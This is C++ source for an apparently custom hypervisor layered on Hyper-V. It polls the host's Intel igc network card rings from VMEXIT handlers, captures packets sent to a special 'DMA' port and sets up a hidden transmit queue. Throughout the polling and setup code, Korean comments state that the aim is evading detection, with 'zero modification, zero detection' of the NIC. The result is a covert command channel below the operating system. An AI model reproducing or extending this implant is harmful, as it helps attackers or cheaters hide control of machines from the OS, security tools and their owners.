                            if (network::dbg_scan_first_addr == 0 && addr != 0) {
                                network::dbg_scan_first_addr = addr;
                                network::dbg_scan_first_hdr = hdr;
                            }

                            if (addr != 0 && addr < 0x0000FFFFFFFFFFFF)
                            {
                                nic::igc_rxq_buf_cache[q][scan_idx] = addr;
                                network::dbg_precache_update++;
                            }
                            else
                            {
                                network::dbg_scan_addr_zero++;
                            }
                        }
                        else
                        {
                            network::dbg_scan_dd1++;
                        }
                    }
                }

                scan_idx = (scan_idx + 1) % rxq.count;
            }

            rxq.scan_cursor = scan_idx;
        }

        // ================================================================
        // [핵심] 큐별 RDH 읽기 (읽기 전용!)
        // ================================================================
        const std::uint32_t rx_head = nic::read_reg(&slat, nic::igc_rxq_rdh(q));
        std::uint32_t idx = rxq.our_index;
        std::uint32_t checked = 0;
        constexpr std::uint32_t MAX_PER_QUEUE = 16; // 큐당 최대 처리량

        while (idx != rx_head && checked < MAX_PER_QUEUE)
        {
            const std::uint64_t desc_gpa = rxq.ring_gpa + idx * 16;
            const auto* wb = static_cast<const nic::igc_rx_desc_wb_t*>(
                memory_manager::map_guest_physical(slat, desc_gpa));
            if (!wb) break;

            if (!(wb->staterr & nic::IGC_RXD_STAT_DD)) break;

            network::dbg_igc_dd_count++;

            if (wb->staterr & nic::IGC_RXD_STAT_EOP)
            {
                const std::uint16_t pkt_len = wb->length;

                // [핵심] buffer address는 큐별 캐시에서 가져옴
                std::uint64_t buf_addr = 0;
                if (rxq.buf_cache_valid && idx < nic::MAX_RXQ_BUF_CACHE)
                    buf_addr = nic::igc_rxq_buf_cache[q][idx];

                if (buf_addr != 0 && pkt_len > 0 && pkt_len <= 1514)
                {
                    network::dbg_cache_hit++;
                    const auto* pkt_data = static_cast<const std::uint8_t*>(
                        memory_manager::map_guest_physical(slat, buf_addr));

                    if (pkt_data)
                    {
                        // [핵심] 0xF5/F7: DMA port 패킷만 raw 캡처 + buf_addr
                        if (pkt_len >= 42) {
                            const std::uint16_t peek_dst = packet::ntohs(
                                *reinterpret_cast<const volatile std::uint16_t*>(pkt_data + 36));
                            if (peek_dst == packet::DMA_PORT) {
                                network::dbg_buf_addr = buf_addr;
                                network::dbg_desc_idx = idx;
                                network::dbg_wb_staterr = wb->staterr;

                                network::dbg_raw_ip_total = packet::ntohs(
                                    *reinterpret_cast<const volatile std::uint16_t*>(pkt_data + 16));
                                network::dbg_raw_byte17 = static_cast<std::uint32_t>(
                                    *reinterpret_cast<const volatile std::uint8_t*>(pkt_data + 17));
                                if (pkt_len >= 50) {
                                    network::dbg_raw_dma4 = *reinterpret_cast<const volatile std::uint32_t*>(
                                        pkt_data + 46);
                                }

                                // [핵심] 0xF7: 전체 hex dump (첫 64바이트)
                                const std::uint32_t dump_len = (pkt_len < 64) ? pkt_len : 64;
                                for (std::uint32_t i = 0; i < 16; i++) {
                                    if (i * 4 + 3 < dump_len) {
                                        network::dbg_hex[i] = *reinterpret_cast<const volatile std::uint32_t*>(
                                            pkt_data + i * 4);
                                    }
                                    else {
                                        network::dbg_hex[i] = 0xDEAD0000 | i;
                                    }
                                }
                            }
                        }

                        // [핵심] Guest 메모리를 로컬 버퍼로 즉시 복사 (race condition 방지)
                        static std::uint8_t rx_local_buf[1514];
                        crt::copy_memory(rx_local_buf, pkt_data, pkt_len);

                        // [핵심] 0xF5: 복사 후에도 DMA port면 copy 캡처
                        if (pkt_len >= 42) {
                            const std::uint16_t peek_dst2 = packet::ntohs(
                                *reinterpret_cast<const volatile std::uint16_t*>(rx_local_buf + 36));
                            if (peek_dst2 == packet::DMA_PORT) {
                                network::dbg_copy_ip_total = packet::ntohs(
                                    *reinterpret_cast<const volatile std::uint16_t*>(rx_local_buf + 16));
                                network::dbg_copy_byte17 = static_cast<std::uint32_t>(
                                    *reinterpret_cast<const volatile std::uint8_t*>(rx_local_buf + 17));
                                if (pkt_len >= 50) {
                                    network::dbg_copy_dma4 = *reinterpret_cast<const volatile std::uint32_t*>(
                                        rx_local_buf + 46);
                                }
                            }
                        }

                        processed |= process_rx_packet(rx_local_buf, pkt_len);
                    }
                }
                else if (pkt_len > 0) {
                    // cache miss - DD=1이지만 buf_addr가 0
                    network::dbg_cache_miss++;
                }
            }

            idx = (idx + 1) % rxq.count;
            checked++;
        }

        rxq.our_index = idx;

        // [핵심 0xFA] post-poll refresh도 유지 (RDT-range 기반)
        // proactive cache가 놓친 부분을 보완
        if (rxq.buf_cache_valid)
            nic::refresh_igc_queue_buf_cache(&slat, q);
    }

    ip_frag::reasm_tick();
    return processed;
}

// ============================================================================
// [핵심] RX Ring Polling - Intel igc Fallback (멀티큐 미초기화시)
// ============================================================================
// 멀티큐 init 실패시 old-style Q0 단일큐 폴링.
// nic::state.rx_ring_gpa + nic::rx_buf_cache[] 사용 (read_ring_config에서 설정됨)
// advanced descriptor 파싱은 동일 (legacy polling은 adv desc 처리 불가!)
// ============================================================================

static std::uint8_t poll_rx_ring_intel_igc_fallback()
{
    const cr3 slat = cached_slat_cr3;
    std::uint8_t processed = 0;

    // [핵심 버그 수정] refresh를 폴링 전에 하면 캐시된 주소가 덮어씌워짐
    // (구) if (nic::rx_buf_cache_valid) refresh_rx_buf_cache_igc();

    const std::uint32_t rx_head = nic::read_reg(&slat, nic::reg_rdh(nic::state));
    const std::uint32_t rx_count = nic::state.rx_count;
    if (rx_count == 0) return 0;

    std::uint32_t idx = nic::state.our_rx_index;
    std::uint32_t checked = 0;
    constexpr std::uint32_t MAX_PACKETS_PER_POLL = 32;

    while (idx != rx_head && checked < MAX_PACKETS_PER_POLL)
    {
        const std::uint64_t desc_gpa = nic::state.rx_ring_gpa + idx * 16;
        const auto* wb = static_cast<const nic::igc_rx_desc_wb_t*>(
            memory_manager::map_guest_physical(slat, desc_gpa));
        if (!wb) break;

        if (!(wb->staterr & nic::IGC_RXD_STAT_DD)) break;

        network::dbg_igc_dd_count++;

        if (wb->staterr & nic::IGC_RXD_STAT_EOP)
        {
            const std::uint16_t pkt_len = wb->length;

            std::uint64_t buf_addr = 0;
            if (nic::rx_buf_cache_valid && idx < nic::MAX_RX_BUF_CACHE)
                buf_addr = nic::rx_buf_cache[idx];

            if (buf_addr != 0 && pkt_len > 0 && pkt_len <= 1514)
            {
                network::dbg_cache_hit++;
                const auto* pkt_data = static_cast<const std::uint8_t*>(
                    memory_manager::map_guest_physical(slat, buf_addr));

                if (pkt_data)
                {
                    // [핵심] Guest 메모리 로컬 복사 (race condition 방지)
                    static std::uint8_t rx_local_buf_fb[1514];
                    crt::copy_memory(rx_local_buf_fb, pkt_data, pkt_len);
                    processed |= process_rx_packet(rx_local_buf_fb, pkt_len);
                }
            }
            else if (pkt_len > 0) {
                network::dbg_cache_miss++;
            }
        }

        idx = (idx + 1) % rx_count;
        checked++;
    }

    nic::state.our_rx_index = idx;

    // [핵심 버그 수정] 폴링 완료 후에 refresh (fallback 경로)
    if (nic::rx_buf_cache_valid)
        refresh_rx_buf_cache_igc();

    ip_frag::reasm_tick();
    return processed;
}

// ============================================================================
// RX Ring Polling - Realtek
// [핵심] Buffer Address Pre-Cache 전략:
// 문제: 다른 vCPU에서 드라이버가 descriptor를 즉시 재활용 → addr=0 race
// 해결: 초기화 시 모든 descriptor의 buffer address를 캐시
//       폴링 때는 opts1만 읽음 (4바이트 = x86 자연 atomic)
//       캐시된 addr로 패킷 데이터 접근
// ============================================================================


// ============================================================================
// RX Ring Polling - Dispatcher
// ============================================================================

static std::uint8_t poll_rx_ring()
{
    if (nic::state.nic_type == nic::nic_type_t::INTEL)
    {
        // [핵심] igc(I225/I226): 멀티큐 폴링 (4개 RX 큐, 읽기 전용!)
        if (nic::state.intel_gen == nic::intel_gen_t::IGC && nic::igc_num_active_queues > 0)
            return poll_rx_ring_intel_igc();
        // [핵심] fallback: 멀티큐 미초기화시에도 advanced desc면 igc 폴링 사용
        // legacy polling은 advanced descriptor 파싱 불가!
        else if (nic::state.use_adv_desc)
            return poll_rx_ring_intel_igc_fallback();
        else
            return poll_rx_ring_intel_legacy();
    }
    return 0;
}

// ============================================================================
// Network Setup
// ============================================================================

void network::set_up()
{
    cached_slat_cr3 = slat::hyperv_cr3();

    constexpr std::uint32_t RESPONSE_PAGES = 512;
    response_buffer = static_cast<std::uint8_t*>(heap_manager::allocate_page());
    response_buffer_size = 0x1000;

    for (std::uint32_t i = 1; i < RESPONSE_PAGES; i++)
    {
        void* page = heap_manager::allocate_page();
        if (page == response_buffer + 0x1000 * i) {
            response_buffer_size += 0x1000;
        }
        else {
            break;
        }
    }

    tx_frame_buffer = static_cast<std::uint8_t*>(heap_manager::allocate_page());

    reasm_buffer = static_cast<std::uint8_t*>(heap_manager::allocate_page());
    std::uint32_t reasm_size = 0x1000;
    for (std::uint32_t i = 1; i < 64; i++)
    {
        void* page = heap_manager::allocate_page();
        if (page == reasm_buffer + 0x1000 * i) {
            reasm_size += 0x1000;
        }
        else {
            break;
        }
    }

    if (!response_buffer || !tx_frame_buffer || !reasm_buffer)
    {
        is_initialized = 0;
        return;
    }

    crt::set_memory(response_buffer, 0, response_buffer_size);
    crt::set_memory(tx_frame_buffer, 0, 0x1000);

    ip_frag::reasm_init(reasm_buffer);

    if (!nic::discover_nic(&cached_slat_cr3)) {
        is_initialized = 0;
        return;
    }

    if (!nic::read_ring_config(&cached_slat_cr3)) {
        is_initialized = 0;
        return;
    }

    // [핵심] MSI-X/MSI capability 탐색 — CF8 PCI config space
    {
        const std::uint8_t bus = nic::state.bus;
        const std::uint8_t dev = nic::state.dev;
        const std::uint8_t func = nic::state.func;

        // Status register bit4 = Capability List
        std::uint16_t status = nic::pci_cf8_read16(bus, dev, func, 0x06);
        if (status & 0x10)
        {
            std::uint8_t cap_ptr = static_cast<std::uint8_t>(
                nic::pci_cf8_read16(bus, dev, func, 0x34) & 0xFF);
            for (int safety = 0; safety < 48 && cap_ptr >= 0x40; safety++)
            {
                std::uint16_t cap_hdr = nic::pci_cf8_read16(bus, dev, func, cap_ptr);
                std::uint8_t cap_id = static_cast<std::uint8_t>(cap_hdr & 0xFF);
                std::uint8_t next = static_cast<std::uint8_t>((cap_hdr >> 8) & 0xFF);

                if (cap_id == nic::PCI_CAP_MSIX)
                {
                    nic::msix_cap_offset = cap_ptr;
                    nic::msix_orig_msgctl = nic::pci_cf8_read16(bus, dev, func, cap_ptr + 2);
                }
                else if (cap_id == nic::PCI_CAP_MSI)
                {
                    nic::msi_cap_offset = cap_ptr;
                }
                cap_ptr = next;
            }
        }
    }

    // ================================================================
    // [FIX] CF8 capability 탐색 실패 시 ECAM 물리메모리로 직접 읽기
    // ================================================================
    // Hyper-V가 CF8/CFC PCI config space를 가상화 → Status bit4=0 → cap list 못 찾음
    // ECAM은 물리 메모리 매핑이므로 NPT walk로 직접 접근 가능
    // ================================================================
    if (nic::msix_cap_offset == 0 && nic::ecam_base_detected != 0)
    {
        const std::uint64_t ecam_dev_base = nic::ecam_base_detected
            + (static_cast<std::uint64_t>(nic::state.bus) << 20)
            + (static_cast<std::uint64_t>(nic::state.dev) << 15)
            + (static_cast<std::uint64_t>(nic::state.func) << 12);

        // ECAM으로 PCI config space 4096바이트 중 처음 256바이트 접근
        const auto* cfg = static_cast<const volatile std::uint8_t*>(
            memory_manager::map_guest_physical(cached_slat_cr3, ecam_dev_base));
        if (cfg)
        {
            // Status register (offset 0x06) bit 4 = Capabilities List
            const std::uint16_t ecam_status = *reinterpret_cast<const volatile std::uint16_t*>(cfg + 0x06);
            std::uint8_t cap_ptr = cfg[0x34]; // Capability pointer
            network::dbg_ecam_status = ecam_status;
            network::dbg_ecam_capptr = cap_ptr;

            // status bit4 없어도 cap_ptr 유효하면 시도
            if ((ecam_status & 0x10) || cap_ptr >= 0x40)
            {
                for (int safety = 0; safety < 48 && cap_ptr >= 0x40; safety++)
                {
                    const std::uint8_t cap_id = cfg[cap_ptr];
                    const std::uint8_t next = cfg[cap_ptr + 1];

                    if (cap_id == nic::PCI_CAP_MSIX)
                    {
                        nic::msix_cap_offset = cap_ptr;
                        nic::msix_orig_msgctl = *reinterpret_cast<const volatile std::uint16_t*>(
                            cfg + cap_ptr + 2);
                    }
                    else if (cap_id == nic::PCI_CAP_MSI)
                    {
                        nic::msi_cap_offset = cap_ptr;
                    }

                    cap_ptr = next;
                }
            }
        }
    }

    // [핵심] igc의 경우 멀티큐 RX 초기화 (4개 큐 전부 폴링)
    // MRQC/RETA 수정 없이 읽기 전용으로 모든 큐에서 패킷 수신!
    if (nic::state.intel_gen == nic::intel_gen_t::IGC)
    {
        if (!nic::read_igc_multi_queue_config(&cached_slat_cr3))
        {
            is_initialized = 0;
            return;
        }
        network::dbg_active_rx_queues = nic::igc_num_active_queues;

        // [핵심] TX Queue 1 초기화 - OS Q0과 완전 격리된 전용 TX 경로
        // hidden page 2장 할당 (descriptor ring + data buffer)
        // VA→GPA 변환으로 NIC에 물리주소 등록
        if (nic::heap_va_pa_valid)
        {
            nic::setup_igc_hv_tx_queue(&cached_slat_cr3);
            // 실패해도 계속 진행 (fallback: packets_dropped 증가)
        }
    }

    // [핵심] MRQC/RETA 수정 완전 제거 - NIC 레지스터 변조 0!
    // 이전: MRQC=0으로 RSS 끔 + RETA 클리어 → OS 네트워크 성능 저하 + 감지 벡터
    // 현재: 4개 큐 전부 읽기 전용 폴링 → 제로 변조, 제로 감지

    is_initialized = 1;
    nic::state.initialized = 1;
}

// ============================================================================
// Process Pending (매 VMEXIT 호출)
// ============================================================================

std::uint8_t network::process_pending()
{
    // ====================================================================
    // [핵심] 멀티 vCPU 경쟁 방지 (try-lock)
    // ====================================================================
    // 문제: 여러 vCPU가 동시에 VMEXIT → 모두 poll_rx_ring() → 같은 descriptor
    //       중복 처리 → 2-4x 응답 전송 → TX ring 경쟁 → stuck → HV 사망
    // 해결: 1개 vCPU만 네트워크 처리, 나머지는 즉시 return
    // _InterlockedCompareExchange: lock cmpxchg (x86 atomic)
    // ====================================================================
    static volatile long rx_processing_lock = 0;
    if (_InterlockedCompareExchange(&rx_processing_lock, 1, 0) != 0)
        return 0;  // 다른 vCPU가 처리 중 → skip

    if (!is_initialized)
    {
        poll_counter++;
        if (poll_counter % 100000 == 0)
        {
            cached_slat_cr3 = slat::hyperv_cr3();
            if (nic::state.mmio_base_gpa == 0)
                nic::discover_nic(&cached_slat_cr3);
            if (nic::state.mmio_base_gpa != 0 && nic::state.rx_count == 0)
            {
                if (nic::read_ring_config(&cached_slat_cr3))
                {
                    // [핵심] retry 경로에서도 멀티큐 + TX Q1 초기화 수행!
                    if (nic::state.intel_gen == nic::intel_gen_t::IGC)
                    {
                        nic::read_igc_multi_queue_config(&cached_slat_cr3);
                        network::dbg_active_rx_queues = nic::igc_num_active_queues;

                        // TX Queue 1 격리 초기화
                        if (nic::heap_va_pa_valid && !nic::igc_hv_tx.initialized)
                            nic::setup_igc_hv_tx_queue(&cached_slat_cr3);
                    }

                    is_initialized = 1;
                    nic::state.initialized = 1;
                }
            }
        }
        _InterlockedExchange(&rx_processing_lock, 0);
        return 0;
    }

    const std::uint64_t now = read_tsc();

    // ====================================================================
    // ====================================================================
    // [v5.4] VMEXIT keepalive 완전 제거
    // ====================================================================
    // v5.0: TXDCTL+TDBAL 체크 → NIC 사망
    // v5.1: 조건부 TDBAL → NIC 사망
    // v5.3: TDBAL==0만 → NIC 사망
    // 결론: 매 VMEXIT MMIO read 자체가 OS NIC driver 타이밍 간섭
    //       TDBAL read도 NIC config space 접근 → OS igc driver와 충돌
    // v4 (keepalive 0, inject pre-check만): 99 MB/s, p2=0/0 검증됨
    // TDBAL=0 복구는 inject pre-check 내부에서 처리
    // ====================================================================

    if ((now - last_poll_tsc) < POLL_INTERVAL_TSC)
    {
        // [핵심] throttle 중이어도 pending TX는 처리!
        // VMEXIT 빈도가 높으므로 TX를 빨리 비워야 함
        if (deferred_tx.active) {
            flush_deferred_tx();
        }
        _InterlockedExchange(&rx_processing_lock, 0);
        return 0;
    }
    last_poll_tsc = now;

    poll_counter++;

    if (deferred_tx.active) {
        flush_deferred_tx();
        if (deferred_tx.active) {
            _InterlockedExchange(&rx_processing_lock, 0);
            return 1;
        }
    }

    const std::uint8_t result = poll_rx_ring();
    dbg_poll_entered++;  // [STALL DIAG] RX poll까지 도달 (deferred TX에 안 막힌 횟수)

    // [핵심] lock 해제 - 반드시 모든 경로에서 해제!
    _InterlockedExchange(&rx_processing_lock, 0);
    return result;
}